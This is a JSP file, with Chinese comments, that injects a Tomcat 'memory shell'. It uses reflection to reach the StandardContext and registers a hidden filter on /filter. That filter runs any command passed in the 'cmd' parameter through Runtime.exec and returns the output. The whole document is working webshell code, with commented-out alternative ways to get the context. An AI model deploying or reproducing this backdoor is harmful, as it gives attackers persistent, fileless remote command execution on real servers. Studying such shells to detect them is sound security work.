<%@ page import="java.io.IOException" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterChain" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedInputStream" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="example.demo.Filter_memshell" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.loader.WebappClassLoaderBase" %>
<%@ page import="org.apache.catalina.webresources.StandardRoot" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public class Filter_memshell implements Filter {
        private String message;
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
            message = "调用 Filter_mem";
        }

        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            PrintWriter printWriter = response.getWriter();
            // 执行命令
            if(cmd != null) {
                InputStream ins = Runtime.getRuntime().exec(cmd).getInputStream();
                BufferedInputStream bins = new BufferedInputStream(ins);
                response.setContentType("text/html;charset=UTF-8");
                printWriter.write("Filter_memshell 被执行");
                int len;
                while ((len = bins.read()) != -1) {
                    printWriter.write(len);
                }
                return;
            }
            // 放行请求
            chain.doFilter(request,response);
        }

        @Override
        public void destroy() {
        }
    }
%>
<%
    try {
        String filterName = "filter_memshell";
        // 获取ServletContext
        ServletContext servletContext = request.getServletContext();

        // 如果存在此filterName的Filter，则不在重复添加
        if (servletContext.getFilterRegistration(filterName) == null){
            // 获取StandardContext方法一
            // Field reqF = request.getClass().getDeclaredField("request");
            // reqF.setAccessible(true);
            // Request req = (Request) reqF.get(request);
            // StandardContext standardContext = (StandardContext) req.getContext();

            // 获取StandardContext方法二
            // 获取ApplicationContextFacade类
            // ServletContext servletContext = request.getSession().getServletContext();
            // // 反射获取ApplicationContextFacade类属性context为ApplicationContext类
            // Field appContextField = servletContext.getClass().getDeclaredField("context");
            // appContextField.setAccessible(true);
            // ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
            // // 反射获取ApplicationContext类属性context为StandardContext类
            // Field standardContextField = applicationContext.getClass().getDeclaredField("context");
            // standardContextField.setAccessible(true);
            // StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

            // 获取StandardContext方法三
            // WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            // StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            // 获取StandardContext方法四
            // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
            StandardContext standardContext = null;
            while (standardContext == null) {
                Field f = servletContext.getClass().getDeclaredField("context");
                f.setAccessible(true);
                Object object = f.get(servletContext);

                if (object instanceof ServletContext) {
                    servletContext = (ServletContext) object;
                } else if (object instanceof StandardContext) {
                    standardContext = (StandardContext) object;
                }
            }

            // 创建FilterDef对象
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            filterDef.setFilter(new Filter_memshell());
            filterDef.setFilterClass(Filter_memshell.class.getName());
            // 添加FilterDef对象
            standardContext.addFilterDef(filterDef);

            // 创建FilterMap
            FilterMap filterMap =new FilterMap();
            filterMap.setFilterName(filterName);
            filterMap.addURLPattern("/filter");
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            // 调用standardContext#addFilterMapBefore添加FilterMap对象
            standardContext.addFilterMapBefore(filterMap);

            // // 调用FilterMaps#addBefore添加FilterMap对象
            // Class ContextFilterMaps = Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
            // Field filterMapsField = standardContext.getClass().getDeclaredField("filterMaps");
            // filterMapsField.setAccessible(true);
            // Object contextFilterMaps = filterMapsField.get(standardContext);
            //
            // Class cl = Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
            // Method m = cl.getDeclaredMethod("addBefore", FilterMap.class);
            // m.setAccessible(true);
            // m.invoke(contextFilterMaps, filterMap);

            // 获得filterConfigs数组
            Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            // 创建 ApplicationFilterConfig 对象
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            // 将filterConfig添加至filterConfigs数组
            filterConfigs.put(filterName,filterConfig);
            response.getWriter().println("Filter内存马添加成功");

        }
    } catch (Exception e){
        response.getWriter().println(e.getMessage());
    }
%>